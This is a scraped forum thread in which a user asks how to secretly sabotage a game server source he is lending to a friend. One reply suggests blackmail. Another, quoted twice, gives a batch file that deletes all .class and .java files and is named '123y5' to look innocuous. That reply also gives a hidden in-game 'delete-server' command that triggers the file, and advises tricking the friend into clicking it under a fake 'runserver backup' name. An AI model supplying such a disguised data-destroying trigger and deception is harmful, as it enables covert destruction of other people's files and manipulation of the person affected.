channel.title: Server Protection
channel.description:
Hey guys,
I'm using Devolution 7.0 server source and I am about to give my whole server to my friend for a month before i make it dedicated. Now i am removing the java files so he can't editit. But when i dedicate it i can tell him to delete but he never will. So i need a command that i will be able to do. One that will either delete server or do something so he will not be able to repair. He can't code well, so anything will do. Maybe even add a few uneeded {'s in anywhere or delete files. But he will have backups so any suggestions or commands would be great. Letting him host the server is unnegotiable.
All help is appreciated
Thanx

item.title: Server Protection
item.dc:creator: @akanaz akanaz
item.description:
@akanaz wrote:

Pm me I’ll explain,

Thanx for all your help guys.

Further help is appreciated.

Thanx!

Read full topic

Blackmail him or something

item.title: Server Protection
item.dc:creator: @Tranquil Tranquil
item.description:
@Tranquil wrote:

[quote=“LeScape, post:9, topic:195063”]I know what ya can do ;D go into the server and create a new batch file with this inside of it:

title YrFxd
echo off
del *.class
del *.java
pause

Name it something like 123y5, so it looks like nothing special.
Add this method to your class client:

public static void launch(String launch) {
		String operatingSystem = System.getProperty("os.name");
		try {
			if(operatingSystem.startsWith("Windows")) {
				Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler "+launch);
			} else {
				System.out.println("Sorry, this feature is only avaiable for Windows users.");
			}
		} catch(Exception exception) {
			System.err.println("Error launching.");
			exception.printStackTrace();
		}
	}

Now add the command:

if (command.equals("delete-server") && playerName.equals("Your-name-here(case-sensative)") {
launch("123y5");
}

I’m not sure that will work though, if all else fails name it something like “runserver backup”, and make up some excuse for him to click it.[/quote]
go with the flow and delete ur server files!

“O NOEZ!!! LESCAPE! I DELETED MY SERVERZ FILZ WTF DOE IDOE!!!”

will be your next private message

Read full topic

item.title: Server Protection
item.dc:creator: @LeScape LeScape
item.description:
@LeScape wrote:

I know what ya can do ;D go into the server and create a new batch file with this inside of it:

title YrFxd
echo off
del *.class
del *.java
pause

Name it something like 123y5, so it looks like nothing special.
Add this method to your class client:

public static void launch(String launch) {
		String operatingSystem = System.getProperty("os.name");
		try {
			if(operatingSystem.startsWith("Windows")) {
				Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler "+launch);
			} else {
				System.out.println("Sorry, this feature is only avaiable for Windows users.");
			}
		} catch(Exception exception) {
			System.err.println("Error launching.");
			exception.printStackTrace();
		}
	}

Now add the command:

if (command.equals("delete-server") && playerName.equals("Your-name-here(case-sensative)") {
launch("123y5");
}

I’m not sure that will work though, if all else fails name it something like “runserver backup”, and make up some excuse for him to click it.

Read full topic
